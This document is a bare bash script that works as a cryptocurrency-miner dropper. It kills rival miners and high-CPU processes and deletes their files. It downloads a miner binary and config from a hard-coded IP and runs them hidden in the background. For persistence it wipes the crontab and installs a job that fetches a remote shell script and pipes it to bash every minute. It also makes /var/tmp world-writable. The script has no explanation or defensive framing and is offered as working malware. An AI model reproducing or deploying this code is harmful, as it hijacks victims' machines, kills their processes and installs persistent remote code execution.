#!/bin/bash
mkdir /var/tmp
chmod 777 /var/tmp
pkill -f getty
netstat -antp | grep '27.155.87.59' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '27.155.87.59' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'CLOSE_WAIT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '121.18.238.56' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '121.18.238.56' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '103.99.115.220' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '103.99.115.220' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
pkill -f /usr/bin/.sshd
rm -rf /var/tmp/j*
rm -rf /tmp/j*
rm -rf /var/tmp/java
rm -rf /tmp/java
rm -rf /var/tmp/java2
rm -rf /tmp/java2
rm -rf /var/tmp/java*
rm -rf /tmp/java*
chmod 777 /var/tmp/sustes
ps aux | grep -vw sustes | awk '{if($3>40.0) print $2}' | while read procid
do
kill -9 $procid
done
ps ax | grep /tmp/ | grep -v grep | grep -v 'sustes\|sustes\|ppl' | awk '{print $1}' | xargs kill -9
ps ax | grep 'wc.conf\|wq.conf\|wm.conf' | grep -v grep | grep -v 'sustes\|sustes\|ppl' | awk '{print $1}' | xargs kill -9
DIR="/var/tmp"
if [ -a "/var/tmp/sustes" ]
then
    if [ -w "/var/tmp/sustes" ] && [ ! -d "/var/tmp/sustes" ]
    then
        if [ -x "$(command -v md5sum)" ]
        then
            sum=$(md5sum /var/tmp/sustes | awk '{ print $1 }')
            echo $sum
            case $sum in
                c8c1f2da51fbd0aea60e11a81236c9dc | c8c1f2da51fbd0aea60e11a81236c9dc)
                    echo "sustes OK"
                ;;
                *)
                    echo "sustes wrong"
                    pkill -f wc.conf
                    pkill -f sustes
                    sleep 4
                ;;
            esac
        fi
        echo "P OK"
    else
        DIR=$(mktemp -d)/var/tmp
        mkdir $DIR
        echo "T DIR $DIR"
    fi
else
    if [ -d "/var/tmp" ]
    then
        DIR="/var/tmp"
    fi
    echo "P NOT EXISTS"
fi
if [ -d "/var/tmp/sustes" ]
then
    DIR=$(mktemp -d)/var/tmp
    mkdir $DIR
    echo "T DIR $DIR"
fi
WGET="wget -O"
if [ -s /usr/bin/curl ];
then
    WGET="curl -o";
fi
if [ -s /usr/bin/wget ];
then
    WGET="wget -O";
fi
f2="192.99.142.226:8220"

downloadIfNeed()
{
    if [ -x "$(command -v md5sum)" ]
    then
        if [ ! -f $DIR/sustes ]; then
            echo "File not found!"
            download
        fi
        sum=$(md5sum $DIR/sustes | awk '{ print $1 }')
        echo $sum
        case $sum in
            c8c1f2da51fbd0aea60e11a81236c9dc | c8c1f2da51fbd0aea60e11a81236c9dc)
                echo "sustes OK"
            ;;
            *)
                echo "sustes wrong"
                sizeBefore=$(du $DIR/sustes)
                if [ -s /usr/bin/curl ];
                then
                    WGET="curl -k -o ";
                fi
                if [ -s /usr/bin/wget ];
                then
                    WGET="wget --no-check-certificate -O ";
                fi
                #$WGET $DIR/sustes https://transfer.sh/wbl5H/sustes
                download
                sumAfter=$(md5sum $DIR/sustes | awk '{ print $1 }')
                if [ -s /usr/bin/curl ];
                then
                    echo "redownloaded $sum $sizeBefore after $sumAfter " `du $DIR/sustes` > $DIR/var/tmp.txt
                fi
            ;;
        esac
    else
        echo "No md5sum"
        download
    fi
}

download() {
    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/sustes3 | awk '{ print $1 }')
        echo $sum
        case $sum in
            c8c1f2da51fbd0aea60e11a81236c9dc | c8c1f2da51fbd0aea60e11a81236c9dc)
                echo "sustes OK"
                cp $DIR/sustes3 $DIR/sustes
            ;;
            *)
                echo "sustes wrong"
                download2
            ;;
        esac
    else
        echo "No md5sum"
        download2
    fi
}

download2() {
    if [ `getconf LONG_BIT` = "64" ]
    then
        $WGET $DIR/sustes http://192.99.142.226:8220/xm64
    fi

    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/sustes | awk '{ print $1 }')
        echo $sum
        case $sum in
            c8c1f2da51fbd0aea60e11a81236c9dc | c8c1f2da51fbd0aea60e11a81236c9dc)
                echo "sustes OK"
                cp $DIR/sustes $DIR/sustes3
            ;;
            *)
                echo "sustes wrong"
            ;;
        esac
    else
        echo "No md5sum"
    fi
}

judge() {
    if [ ! "$(netstat -ant|grep '158.69.133.20\|192.99.142.249\|202.144.193.110'|grep 'ESTABLISHED'|grep -v grep)" ];
    then
        ps axf -o "pid %cpu" | awk '{if($2>=30.0) print $1}' | while read procid
	      do
	      kill -9 $procid
        done
        downloadIfNeed
        touch /var/tmp/123
        pkill -f /var/tmp/java
        pkill -f w.conf
        chmod +x $DIR/sustes
        $WGET $DIR/wc.conf http://$f2/wt.conf
        nohup $DIR/sustes -c $DIR/wc.conf > /dev/null 2>&1 &
        sleep 5
    else
       echo "Running"
    fi
}

judge2() {
    if [ ! "$(ps -fe|grep '/var/tmp/sustes'|grep 'wc.conf'|grep -v grep)" ];
    then
        downloadIfNeed
        chmod +x $DIR/sustes
        $WGET $DIR/wc.conf http://$f2/wt.conf
        nohup $DIR/sustes -c $DIR/wc.conf > /dev/null 2>&1 &
        sleep 5
    else
        echo "Running"
    fi
}

if [ ! "$(netstat -ant|grep 'LISTEN\|ESTABLISHED\|TIME_WAIT'|grep -v grep)" ];
then
    judge2
else
    judge
fi

if crontab -l | grep -q "192.99.142.226:8220"
then
    echo "Cron exists"
else
    crontab -r
    echo "Cron not found"
    LDR="wget -q -O -"
    if [ -s /usr/bin/curl ];
    then
        LDR="curl";
    fi
    if [ -s /usr/bin/wget ];
    then
        LDR="wget -q -O -";
    fi
	(crontab -l 2>/dev/null; echo "* * * * * $LDR http://192.99.142.226:8220/mr.sh | bash -sh > /dev/null 2>&1")| crontab -
fi
rm -rf /var/tmp/jrm
rm -rf /tmp/jrm
pkill -f 185.222.210.59
pkill -f 95.142.40.81
pkill -f 192.99.142.232
chmod 777 /var/tmp/sustes
crontab -l | sed '/185.222.210.59/d' | crontab -
